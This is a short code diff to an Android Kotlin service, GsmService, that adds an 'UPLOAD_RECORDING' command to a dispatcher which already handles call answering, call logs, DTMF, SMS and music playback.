@@ -462,6 +462,7 @@ class GsmService : Service() {
                 "ANSWER_CALL" -> callController.handleAnswerCall()
                 "DECLINE_CALL" -> callController.handleDeclineCall()
                 "GET_CALL_LOG" -> callController.handleGetCallLog(data)
+                "UPLOAD_RECORDING" -> callController.handleUploadRecording(data)
                 "SEND_DTMF" -> callController.handleSendDtmf(data)
                 "SEND_SMS" -> smsController.handleSendSms(data)
                 "MUSIC_PLAY" -> {
